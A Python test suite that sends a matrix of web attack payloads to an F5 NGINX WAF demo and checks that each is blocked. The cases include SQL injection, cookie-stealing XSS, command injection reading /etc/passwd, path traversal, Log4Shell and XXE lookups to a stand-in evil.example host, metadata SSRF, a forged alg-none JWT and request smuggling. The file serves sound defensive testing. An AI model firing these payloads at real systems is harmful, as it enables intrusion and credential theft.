#!/usr/bin/env python3
"""
Live F5 NGINX attack matrix for the payments fictionally.org demo.

Defaults:
  F5_HOST = http://localhost:8083
  OPEN_HOST   = https://payments-open.fictionally.org

Asserts F5 NGINX blocks (403 + x-f5-block) while the open host does not.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import ssl
import sys
import unittest
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import quote

CTX = ssl.create_default_context()

DEFAULT_F5 = os.environ.get(
    "F5_HOST", "http://192.168.1.177:8083"
).rstrip("/")
DEFAULT_OPEN = os.environ.get(
    "OPEN_HOST", "http://192.168.1.177:8081"
).rstrip("/")


def _b64url(obj: dict) -> str:
    return (
        base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )


FORGED_JWT = (
    f'{_b64url({"alg": "none", "typ": "JWT"})}.'
    f'{_b64url({"sub": "admin", "role": "admin"})}.'
)


def encode_path(path: str) -> str:
    if "?" not in path:
        return quote(path, safe="/")
    p, q = path.split("?", 1)
    return quote(p, safe="/") + "?" + quote(
        q, safe="=&/:%*()[]{}$!,;@'\"<>|^~-._+"
    )


@dataclass
class Case:
    name: str
    rule_id: str
    method: str
    path: str
    expect: str = "block"  # block | allow | monitor
    body: Optional[str] = None
    headers: dict = field(default_factory=dict)
    alt_rules: tuple = ()
    check_open: bool = True
    content_type: Optional[str] = None
    notes: str = ""


CASES: list[Case] = [
    Case("sqli-union", "f5-rule-sqli-001", "GET",
         "/products?cat=x' UNION SELECT * FROM users--"),
    Case("sqli-select-from", "f5-rule-sqli-002", "GET",
         "/products?cat=select id from users"),
    Case("sqli-insert", "f5-rule-sqli-003", "GET",
         "/products?cat=x'; INSERT INTO users VALUES(1)--"),
    Case("sqli-drop", "f5-rule-sqli-004", "GET",
         "/products?cat=x'; DROP TABLE users--"),
    Case("sqli-boolean", "f5-rule-sqli-005", "GET",
         "/products?cat=1 OR 1=1"),
    Case("sqli-comment-monitor", "f5-rule-sqli-006", "GET",
         "/products?cat=1-- ", expect="monitor",
         notes="comment-only SQLi staged as monitor — must not hard-block alone"),
    Case("sqli-time", "f5-rule-sqli-007", "GET",
         "/products?cat=1; SELECT SLEEP(1)"),
    Case("xss-script", "f5-rule-xss-001", "GET",
         "/search?q=<script>alert(document.cookie)</script>"),
    Case("xss-javascript-uri", "f5-rule-xss-002", "GET",
         "/search?q=javascript:alert(1)"),
    Case("xss-event-handler", "f5-rule-xss-003", "GET",
         "/search?q=<img src=x onerror=alert(1)>"),
    Case("xss-html-tag-src", "f5-rule-xss-004", "GET",
         "/search?q=<img src=http://evil.example/x>"),
    Case("xss-dom-eval", "f5-rule-xss-005", "GET",
         "/search?q=eval(document.cookie)"),
    Case("cmdi-semicolon", "f5-rule-cmdi-001", "GET",
         "/ping?host=127.0.0.1;id"),
    Case("cmdi-pipe", "f5-rule-cmdi-001", "GET",
         "/ping?host=127.0.0.1|cat /etc/passwd"),
    Case("cmdi-backtick", "f5-rule-cmdi-001", "GET",
         "/ping?host=`id`"),
    Case("cmdi-subshell", "f5-rule-cmdi-001", "GET",
         "/ping?host=$(whoami)"),
    Case("lfi-dotdot", "f5-rule-lfi-001", "GET",
         "/statement?file=../../../../../../etc/passwd"),
    Case("lfi-passwd", "f5-rule-lfi-001", "GET",
         "/statement?file=/etc/passwd"),
    Case("lfi-encoded", "f5-rule-lfi-001", "GET",
         "/statement?file=..%2f..%2f..%2fetc/passwd"),
    Case("proto-null-byte", "f5-rule-proto-001", "GET",
         "/products?cat=foo%00"),
    Case("proto-crlf", "f5-rule-proto-001", "GET",
         "/products?cat=x%0d%0aX-Injected:1"),
    Case("ssti-arithmetic", "f5-rule-ssti-001", "GET",
         "/render?tpl={{7*7}}"),
    Case("ssti-config", "f5-rule-ssti-001", "GET",
         "/render?tpl={{config}}"),
    Case("log4shell-jndi", "f5-rule-log4shell-001", "GET",
         "/lookup?user=${jndi:ldap://evil.example/a}"),
    Case("log4shell-obfuscated", "f5-rule-log4shell-001", "GET",
         "/lookup?user=${${lower:j}ndi:ldap://evil.example/a}"),
    Case("spring4shell", "f5-rule-spring4shell-001", "GET",
         "/bind?class.module.classLoader.URLs%5B0%5D=x"),
    Case("ssrf-metadata", "f5-rule-ssrf-001", "GET",
         "/fetch?url=http://169.254.169.254/latest/meta-data/"),
    Case("ssrf-gopher", "f5-rule-ssrf-001", "GET",
         "/fetch?url=gopher://127.0.0.1:70/1"),
    Case("nosqli", "f5-rule-nosqli-001", "POST",
         "/api/login", body='{"user":"admin","pass":{"$ne":null}}',
         content_type="application/json"),
    Case("xxe", "f5-rule-xxe-001", "POST",
         "/api/import",
         body='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"http://evil.example/x">]><foo>&xxe;</foo>',
         content_type="application/xml"),
    Case("jwt-alg-none", "f5-rule-jwt-none-001", "GET", "/api/me",
         headers={"Authorization": f"Bearer {FORGED_JWT}"},
         alt_rules=("VIOL_JWT_ALG",)),
    Case("proto-pollution", "f5-rule-protopollute-001", "POST",
         "/api/merge", body='{"__proto__":{"admin":true}}',
         content_type="application/json"),
    Case("graphql-introspection", "f5-rule-graphql-introspection-001", "POST",
         "/graphql",
         body='{"query":"query IntrospectionQuery {__schema {types {name}}}"}',
         content_type="application/json"),
    Case("scanner-ua", "f5-rule-scanner-ua-001", "GET",
         "/products?cat=deposit",
         headers={"User-Agent": "sqlmap/1.7.11#stable (https://sqlmap.org)"}),
    Case("cmdi-json-chain", "f5-rule-cmdi-json-001", "POST",
         "/api/login", body='{"user":"a","pass":"x; id"}',
         content_type="application/json"),
    Case("mass-assignment", "f5-rule-massassign-001", "POST",
         "/api/profile", body='{"user":"me","role":"admin"}',
         content_type="application/json"),
    Case("http-request-smuggling", "f5-rule-smuggling-001", "POST",
         "/api/batch",
         body='{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n',
         content_type="text/plain",
         notes="smuggled request line embedded in the body (CWE-444)"),
    Case("open-redirect-staged", "none", "GET",
         "/products?redirect=https://evil.example/phish",
         expect="allow",
         notes="staged allow — must not hard-block"),
    Case("v2-filetype", "f5-rule-filetype-001", "GET", "/config.env",
         check_open=False),
    Case("v2-method", "f5-rule-method-001", "PUT", "/api/profile",
         body='{"user":"me"}', content_type="application/json",
         check_open=False),
    Case("benign-products", "none", "GET", "/products?cat=deposit",
         expect="allow"),
    Case("benign-home", "none", "GET", "/", expect="allow"),
    Case("bola-idor-business-logic", "none", "GET", "/api/accounts/9999",
         expect="allow",
         notes="object-level authz is outside signature/gateway threat rules"),
]


def fire(base, method, path, body, headers, content_type):
    url = base.rstrip("/") + encode_path(path)
    data = body.encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    hdrs = {"User-Agent": headers.get("User-Agent", "f5-live-test/1.0"),
            "x-f5-demo-mode": "lab"}
    hdrs.update(headers)
    if body is not None and not any(k.lower() == "content-type" for k in hdrs):
        hdrs["Content-Type"] = content_type or (
            "application/json" if body.lstrip()[:1] in "{[" else "application/xml"
        )
    for k, v in hdrs.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=20, context=CTX) as resp:
            raw = resp.read(8192).decode("utf-8", "replace")
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, raw
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8", "replace")
        return e.code, {k.lower(): v for k, v in e.headers.items()}, raw
    except Exception as e:
        return 0, {}, f"ERROR {e}"


def is_blocked(status: int, headers: dict) -> bool:
    return status == 403 and headers.get("x-f5-block", "").lower() == "true"


def matched_rule(headers: dict) -> str:
    return headers.get("x-f5-rule") or headers.get("x-f5-violation") or ""


class F5NginxLiveTests(unittest.TestCase):
    apigee = DEFAULT_F5
    open_host = DEFAULT_OPEN
    skip_open = False

    @classmethod
    def setUpClass(cls) -> None:
        st, _, _ = fire(cls.apigee, "GET", "/", None, {}, None)
        if st == 0:
            raise unittest.SkipTest(f"apigee host unreachable: {cls.apigee}")


def _make_test(case: Case):
    def test(self: F5NginxLiveTests) -> None:
        st, hdrs, _ = fire(
            self.apigee, case.method, case.path, case.body,
            case.headers, case.content_type,
        )
        blocked = is_blocked(st, hdrs)
        rule = matched_rule(hdrs)
        allowed = {case.rule_id, *case.alt_rules, case.rule_id.replace("f5-rule-", "waf-rule-")}

        if case.expect == "block":
            self.assertTrue(
                blocked,
                f"{case.name}: expected F5 NGINX block, got status={st} rule={rule!r} "
                f"hdrs={[ (k,v) for k,v in hdrs.items() if k.startswith('x-f5') ]}",
            )
            if case.rule_id != "none":
                self.assertTrue(
                    rule in allowed or any(a in rule for a in allowed if a != "none"),
                    f"{case.name}: blocked by unexpected rule {rule!r}; expected {sorted(allowed)}",
                )
        elif case.expect in ("allow", "monitor"):
            self.assertFalse(
                blocked,
                f"{case.name}: expected no hard block ({case.expect}), got {st} {rule!r}",
            )

        if case.check_open and not self.skip_open and case.expect == "block":
            ost, ohdrs, _ = fire(
                self.open_host, case.method, case.path, case.body,
                case.headers, case.content_type,
            )
            self.assertFalse(
                ost == 403 and ohdrs.get("x-f5-block", "").lower() == "true",
                f"{case.name}: open host unexpectedly F5 NGINX-blocked",
            )
            self.assertNotEqual(ost, 0, f"{case.name}: open host unreachable")

    return test


for _c in CASES:
    setattr(F5NginxLiveTests, f"test_{_c.name.replace('-', '_')}", _make_test(_c))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--apigee", default=DEFAULT_F5)
    ap.add_argument("--open", default=DEFAULT_OPEN)
    ap.add_argument("--skip-open", action="store_true")
    args, rest = ap.parse_known_args()
    F5NginxLiveTests.apigee = args.apigee.rstrip("/")
    F5NginxLiveTests.open_host = args.open.rstrip("/")
    F5NginxLiveTests.skip_open = args.skip_open
    sys.argv = [sys.argv[0], *rest]
    unittest.main(verbosity=2)


if __name__ == "__main__":
    main()
